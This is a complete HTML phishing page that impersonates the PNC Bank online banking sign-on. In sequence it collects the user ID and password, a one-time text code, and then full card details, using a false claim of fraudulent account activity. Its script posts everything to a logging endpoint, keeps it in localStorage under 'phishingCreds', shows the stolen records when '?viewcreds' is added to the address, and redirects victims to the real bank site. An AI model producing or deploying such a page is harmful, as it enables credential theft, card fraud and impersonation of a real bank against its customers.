<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PNC Bank - Online Banking Sign On</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #fff; margin: 0; padding: 0; }
        .header { background-color: #0069a6; padding: 10px 20px; display: flex; align-items: center; }
        .logo { height: 50px; }
        .container { max-width: 400px; margin: 40px auto; padding: 20px; }
        h1 { color: #f26822; font-size: 24px; }
        label { display: block; margin: 10px 0 5px; font-weight: bold; }
        input { width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ccc; }
        button { background-color: #f26822; color: #fff; padding: 12px; width: 100%; border: none; font-weight: bold; cursor: pointer; }
        button:hover { background-color: #d95e1e; }
        .links { text-align: center; margin-top: 20px; }
        .links a { color: #0069a6; text-decoration: none; margin: 0 10px; }
        .footer { text-align: center; font-size: 12px; color: #666; margin-top: 40px; }
        #otp-section, #card-section { display: none; }
        .message { color: #f26822; font-weight: bold; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://upload.wikimedia.org/wikipedia/commons/1/1b/PNClogo.svg" alt="PNC Logo" class="logo">
    </div>
    <div class="container">
        <h1>Sign On to Online Banking</h1>
        <div id="login-section">
            <form id="login-form">
                <label for="user">User ID</label>
                <input type="text" id="user" required>
                <label for="password">Password</label>
                <input type="password" id="password" required>
                <button type="submit">Sign On</button>
            </form>
            <div class="links">
                <a href="#">Forgot User ID or Password?</a>
                <a href="#">Enroll in Online Banking</a>
            </div>
        </div>
        <div id="otp-section">
            <p class="message">A 6-digit code has been sent to your device via text.</p>
            <form id="otp-form">
                <label for="otp">Enter Code</label>
                <input type="text" id="otp" maxlength="6" required>
                <button type="submit">Verify</button>
            </form>
        </div>
        <div id="card-section">
            <p class="message">To lift the fraudulent activity on your account, you must enter your card details.</p>
            <form id="card-form">
                <label for="cardnumber">Card Number</label>
                <input type="text" id="cardnumber" required>
                <label for="name">Name on Card</label>
                <input type="text" id="name" required>
                <label for="expiry">Expiration Date (MM/YY)</label>
                <input type="text" id="expiry" required>
                <label for="cvv">CVV</label>
                <input type="text" id="cvv" maxlength="3" required>
                <button type="submit">Submit</button>
            </form>
        </div>
    </div>
    <div class="footer">
        Â© 2025 PNC Bank, N.A. All rights reserved. Member FDIC.
    </div>
    <script>
        let creds = {};
        let storedCreds = localStorage.getItem('phishingCreds') || '';
        if (location.search === '?viewcreds') {
            document.body.innerHTML = '<h1>Captured Credentials (Local Storage)</h1><pre>' + storedCreds.replace(/\n/g, '<br>') + '</pre>';
        } else {
            document.getElementById('login-form').addEventListener('submit', (e) => {
                e.preventDefault();
                creds.user = document.getElementById('user').value;
                creds.password = document.getElementById('password').value;
                document.getElementById('login-section').style.display = 'none';
                document.getElementById('otp-section').style.display = 'block';
            });
            document.getElementById('otp-form').addEventListener('submit', (e) => {
                e.preventDefault();
                creds.otp = document.getElementById('otp').value;
                document.getElementById('otp-section').style.display = 'none';
                document.getElementById('card-section').style.display = 'block';
            });
            document.getElementById('card-form').addEventListener('submit', (e) => {
                e.preventDefault();
                creds.cardnumber = document.getElementById('cardnumber').value;
                creds.name = document.getElementById('name').value;
                creds.expiry = document.getElementById('expiry').value;
                creds.cvv = document.getElementById('cvv').value;
                fetch('/api/log', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(creds) }).catch(() => {});
                storedCreds += JSON.stringify(creds) + '\n';
                localStorage.setItem('phishingCreds', storedCreds);
                window.location.href = 'https://www.pnc.com/';
            });
        }
    </script>
</html>
